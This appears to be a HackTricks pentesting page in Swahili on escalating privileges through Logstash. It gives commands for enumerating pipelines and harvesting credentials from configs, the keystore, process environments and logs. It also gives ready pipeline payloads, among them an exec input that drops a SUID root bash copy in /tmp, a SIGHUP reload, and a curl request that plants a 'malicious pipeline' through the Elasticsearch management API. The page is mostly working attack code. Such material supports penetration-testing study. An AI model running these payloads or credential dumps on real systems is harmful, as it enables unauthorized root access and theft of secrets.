# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash hutumiwa **kukusanya, kubadilisha, na kusambaza logs** kupitia mfumo unaojulikana kama **pipelines**. Pipelines hizi zinajumuisha hatua za **input**, **filter**, na **output**. Jambo la kuvutia hutokea Logstash inapoendeshwa kwenye mashine iliyoathiriwa.

### Usanidi wa Pipeline

Pipelines husanidiwa katika faili **/etc/logstash/pipelines.yml**, ambayo huorodhesha maeneo ya usanidi wa pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Faili hii hufichua mahali zilipo faili za **.conf**, zenye pipeline configurations. Unapotumia **Elasticsearch output module**, ni jambo la kawaida kwa **pipelines** kuwa na **Elasticsearch credentials**, ambazo mara nyingi huwa na privileges pana kwa sababu Logstash inahitaji kuandika data kwenye Elasticsearch. Wildcards katika configuration paths huruhusu Logstash kutekeleza pipelines zote zinazolingana katika directory iliyoteuliwa.

Ikiwa Logstash imeanzishwa kwa `-f <directory>` badala ya `pipelines.yml`, **faili zote zilizo ndani ya directory hiyo huunganishwa kwa mpangilio wa lexicographical na kuchanganuliwa kama config moja**. Hii huleta athari 2 za kiudhalifu:

- Faili iliyowekwa kama `000-input.conf` au `zzz-output.conf` inaweza kubadilisha jinsi pipeline ya mwisho inavyoundwa
- Faili yenye hitilafu inaweza kuzuia pipeline nzima kupakiwa, kwa hivyo hakikisha payloads kwa uangalifu kabla ya kutegemea auto-reload

### Fast Enumeration kwenye Host Iliyoathiriwa

Kwenye box ambayo Logstash imesakinishwa, kagua kwa haraka:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Pia angalia ikiwa local monitoring API inafikika. Kwa chaguo-msingi, inafungamana na **127.0.0.1:9600**, ambacho kwa kawaida kinatosha baada ya kupata ufikiaji wa host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Hii kwa kawaida hukupa pipeline IDs, maelezo ya runtime, na uthibitisho kwamba pipeline yako iliyorekebishwa imepakiwa.

Credentials zilizopatikana kutoka Logstash kwa kawaida hufungua **Elasticsearch**, kwa hiyo angalia [ukurasa huu mwingine kuhusu Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation kupitia Pipelines Zinazoweza Kuandikwa

Ili kujaribu Privilege Escalation, kwanza tambua user ambaye huduma ya Logstash inaendeshwa chini yake, kwa kawaida user wa **logstash**. Hakikisha unatimizwa na **moja** ya vigezo hivi:

- Una **write access** kwenye faili la pipeline **.conf** **au**
- Faili la **/etc/logstash/pipelines.yml** linatumia wildcard, na unaweza kuandika kwenye folder lengwa

Zaidi ya hayo, **moja** ya masharti haya lazima itimizwe:

- Una uwezo wa kurestart huduma ya Logstash **au**
- Faili la **/etc/logstash/logstash.yml** limewekwa **config.reload.automatic: true**

Ikiwa kuna wildcard kwenye configuration, kuunda faili linalolingana na wildcard hiyo kunaruhusu command execution. Kwa mfano:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hapa, **interval** huamua frequency ya utekelezaji kwa sekunde. Katika mfano uliotolewa, command ya **whoami** huendeshwa kila baada ya sekunde 120, huku output yake ikielekezwa kwenye **/tmp/output.log**.

Kwa **config.reload.automatic: true** katika **/etc/logstash/logstash.yml**, Logstash itagundua na kutumia kiotomatiki pipeline configurations mpya au zilizobadilishwa bila kuhitaji restart.<sup>[[1]](#references)</sup> Ikiwa hakuna wildcard, mabadiliko bado yanaweza kufanywa kwenye configurations zilizopo, lakini tahadhari inashauriwa ili kuepuka disruptions.

### Pipeline Payloads Zinazoaminika Zaidi

`exec` input plugin bado hufanya kazi katika releases za sasa na inahitaji ama `interval` au `schedule`. Huitekeleza kwa **forking** Logstash JVM, kwa hivyo ikiwa memory ni finyu payload yako inaweza kushindwa kwa `ENOMEM` badala ya kuendelea kufanya kazi kimya kimya.

Privilege-escalation payload ya kivitendo zaidi kwa kawaida ni ile inayoacha artifact ya kudumu:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ikiwa huna ruhusa za kuanzisha upya lakini unaweza kutuma signal kwa mchakato, Logstash pia inatumia reload inayoanzishwa na **SIGHUP** kwenye mifumo kama Unix:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Kumbuka kwamba si kila plugin inaweza kufanya reload bila matatizo. Kwa mfano, input ya **stdin** huzuia reload ya kiotomatiki, kwa hivyo usidhani kwamba `config.reload.automatic` itachukua mabadiliko yako kila wakati.<sup>[[1]](#references)</sup>

### Kuiba Secrets kutoka Logstash

Kabla ya kulenga tu code execution, kusanya data ambayo Logstash tayari inaweza kufikia:

- Credentials za plaintext mara nyingi huwekwa moja kwa moja ndani ya outputs za `elasticsearch {}`, `http_poller`, inputs za JDBC, au mipangilio inayohusiana na cloud
- Secure settings zinaweza kuwa katika **`/etc/logstash/logstash.keystore`** au directory nyingine ya `path.settings`
- Nenosiri la keystore mara nyingi hutolewa kupitia **`LOGSTASH_KEYSTORE_PASS`**, na installs zinazotumia packages kwa kawaida hulipata kutoka **`/etc/sysconfig/logstash`**
- Upanuzi wa environment variables kwa kutumia `${VAR}` hutatuliwa Logstash inapoanza, kwa hivyo mazingira ya service yanafaa kuchunguzwa

Ukaguzi muhimu:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Hili pia linafaa kuchunguzwa kwa sababu **CVE-2023-46672** ilionyesha kuwa Logstash inaweza kurekodi taarifa nyeti kwenye logs chini ya hali maalum. Kwenye host ya post-exploitation, logs za zamani za Logstash na maingizo ya `journald` yanaweza hivyo kufichua credentials hata ikiwa config ya sasa inarejelea keystore badala ya kuhifadhi secrets moja kwa moja.<sup>[[3]](#references)</sup>

### Abuse ya Centralized Pipeline Management

Katika baadhi ya mazingira, host **haitumii** kabisa faili za ndani za `.conf`. Ikiwa **`xpack.management.enabled: true`** imewekwa, Logstash inaweza kuvuta pipelines zinazodhibitiwa katikati kutoka Elasticsearch/Kibana, na baada ya kuwezesha mode hii, local pipeline configs si chanzo cha ukweli tena.<sup>[[2]](#references)</sup>

Hii inamaanisha attack path tofauti:

1. Rejesha Elastic credentials kutoka kwenye settings za ndani za Logstash, keystore, au logs
2. Thibitisha ikiwa account ina cluster privilege ya **`manage_logstash_pipelines`**
3. Unda au badilisha centrally managed pipeline ili host ya Logstash itekeleze payload yako kwenye poll interval inayofuata

Elasticsearch API inayotumiwa kwa feature hii ni:<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Hii ni muhimu hasa wakati local files ni read-only lakini Logstash tayari imesajiliwa ili fetch pipelines remotely.

## Marejeo

- [1] [Elastic Docs: Kupakia upya Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Kusanidi Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
